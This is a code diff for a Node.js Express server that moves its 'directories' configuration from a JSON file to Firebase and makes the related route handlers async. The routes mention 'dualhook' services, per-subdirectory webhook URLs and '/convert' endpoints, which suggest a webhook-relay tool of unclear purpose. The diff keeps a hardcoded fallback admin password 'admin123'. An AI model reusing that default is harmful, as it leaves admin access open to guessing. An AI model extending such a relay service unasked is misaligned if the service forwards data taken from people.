@@ -27,29 +27,28 @@ admin.initializeApp({
 const db = admin.database();
 
 // Directory management
-const DIRECTORIES_FILE = path.join(__dirname, 'directories.json');
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123'; // Change this!
 
-// Load directories from file
-function loadDirectories() {
+// Load directories from Firebase
+async function loadDirectories() {
   try {
-    if (fs.existsSync(DIRECTORIES_FILE)) {
-      const data = fs.readFileSync(DIRECTORIES_FILE, 'utf8');
-      return JSON.parse(data);
-    }
+    const snapshot = await db.ref('directories').once('value');
+    const directories = snapshot.val();
+    return directories || {};
   } catch (error) {
-    console.error('Error loading directories:', error);
+    console.error('Error loading directories from Firebase:', error);
+    return {};
   }
-  return {};
 }
 
-// Save directories to file
-function saveDirectories(directories) {
+// Save directories to Firebase
+async function saveDirectories(directories) {
   try {
-    fs.writeFileSync(DIRECTORIES_FILE, JSON.stringify(directories, null, 2));
+    await db.ref('directories').set(directories);
+    console.log('✅ Directories saved to Firebase');
     return true;
   } catch (error) {
-    console.error('Error saving directories:', error);
+    console.error('Error saving directories to Firebase:', error);
     return false;
   }
 }
@@ -191,7 +190,7 @@ app.post('/api/create-directory', async (req, res) => {
     }
 
     // Load existing directories
-    const directories = loadDirectories();
+    const directories = await loadDirectories();
 
     // Check if directory already exists
     if (directories[directoryName]) {
@@ -209,7 +208,7 @@ app.post('/api/create-directory', async (req, res) => {
     };
 
     // Save directories
-    if (!saveDirectories(directories)) {
+    if (!(await saveDirectories(directories))) {
       return res.status(500).json({ error: 'Failed to save directory configuration' });
     }
 
@@ -929,9 +928,9 @@ app.post('/convert', validateRequest, async (req, res) => {
 });
 
 // Dynamic route handler for custom directories
-app.get('/:directory', (req, res) => {
+app.get('/:directory', async (req, res) => {
   const directoryName = req.params.directory;
-  const directories = loadDirectories();
+  const directories = await loadDirectories();
 
   if (directories[directoryName]) {
     // Serve a custom page for this directory or redirect to main page
@@ -942,9 +941,9 @@ app.get('/:directory', (req, res) => {
 });
 
 // Route handler for dualhook create page
-app.get('/:directory/create', (req, res) => {
+app.get('/:directory/create', async (req, res) => {
   const directoryName = req.params.directory;
-  const directories = loadDirectories();
+  const directories = await loadDirectories();
 
   if (directories[directoryName] && directories[directoryName].serviceType === 'dualhook') {
     res.sendFile(path.join(__dirname, 'public', 'dualhook-create.html'));
@@ -954,10 +953,10 @@ app.get('/:directory/create', (req, res) => {
 });
 
 // Route handler for subdirectories
-app.get('/:directory/:subdirectory', (req, res) => {
+app.get('/:directory/:subdirectory', async (req, res) => {
   const directoryName = req.params.directory;
   const subdirectoryName = req.params.subdirectory;
-  const directories = loadDirectories();
+  const directories = await loadDirectories();
 
   if (directories[directoryName] && directories[directoryName].subdirectories[subdirectoryName]) {
     // Serve the same page for subdirectories
@@ -971,7 +970,7 @@ app.get('/:directory/:subdirectory', (req, res) => {
 app.post('/:directory/convert', async (req, res) => {
   try {
     const directoryName = req.params.directory;
-    const directories = loadDirectories();
+    const directories = await loadDirectories();
 
     // Check if directory exists
     if (!directories[directoryName]) {
@@ -1092,7 +1091,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
     const { subdirectoryName, webhookUrl } = req.body;
 
     // Load directories
-    const directories = loadDirectories();
+    const directories = await loadDirectories();
 
     // Check if parent directory exists and is dualhook type
     if (!directories[parentDirectory] || directories[parentDirectory].serviceType !== 'dualhook') {
@@ -1122,7 +1121,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
     };
 
     // Save directories
-    if (!saveDirectories(directories)) {
+    if (!(await saveDirectories(directories))) {
       return res.status(500).json({ error: 'Failed to save subdirectory configuration' });
     }
 
@@ -1168,9 +1167,9 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
 });
 
 // Get API token for specific directory
-app.get('/:directory/api/token', (req, res) => {
+app.get('/:directory/api/token', async (req, res) => {
   const directoryName = req.params.directory;
-  const directories = loadDirectories();
+  const directories = await loadDirectories();
 
   if (!directories[directoryName]) {
     return res.status(404).json({ error: 'Directory not found' });
@@ -1191,10 +1190,10 @@ app.get('/:directory/api/token', (req, res) => {
 });
 
 // Get API token for subdirectories
-app.get('/:directory/:subdirectory/api/token', (req, res) => {
+app.get('/:directory/:subdirectory/api/token', async (req, res) => {
   const directoryName = req.params.directory;
   const subdirectoryName = req.params.subdirectory;
-  const directories = loadDirectories();
+  const directories = await loadDirectories();
 
   if (!directories[directoryName] || !directories[directoryName].subdirectories[subdirectoryName]) {
     return res.status(404).json({ error: 'Subdirectory not found' });
@@ -1219,7 +1218,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
   try {
     const directoryName = req.params.directory;
     const subdirectoryName = req.params.subdirectory;
-    const directories = loadDirectories();
+    const directories = await loadDirectories();
 
     // Check if subdirectory exists
     if (!directories[directoryName] || !directories[directoryName].subdirectories[subdirectoryName]) {
@@ -1387,19 +1386,22 @@ app.listen(PORT, '0.0.0.0', () => {
   }
 
   // Log existing directories
-  const directories = loadDirectories();
-  const directoryNames = Object.keys(directories);
-  if (directoryNames.length > 0) {
-    console.log('📁 Active directories:', directoryNames.join(', '));
+  loadDirectories().then(directories => {
+    const directoryNames = Object.keys(directories);
+    if (directoryNames.length > 0) {
+      console.log('📁 Active directories:', directoryNames.join(', '));
 
-    // Log subdirectories for dualhook services
-    directoryNames.forEach(dir => {
-      if (directories[dir].serviceType === 'dualhook') {
-        const subdirs = Object.keys(directories[dir].subdirectories);
-        if (subdirs.length > 0) {
-          console.log(`🔗 Dualhook subdirectories for ${dir}:`, subdirs.join(', '));
+      // Log subdirectories for dualhook services
+      directoryNames.forEach(dir => {
+        if (directories[dir].serviceType === 'dualhook') {
+          const subdirs = Object.keys(directories[dir].subdirectories);
+          if (subdirs.length > 0) {
+            console.log(`🔗 Dualhook subdirectories for ${dir}:`, subdirs.join(', '));
+          }
         }
-      }
-    });
-  }
+      });
+    }
+  }).catch(error => {
+    console.error('Error loading directories on startup:', error);
+  });
 });
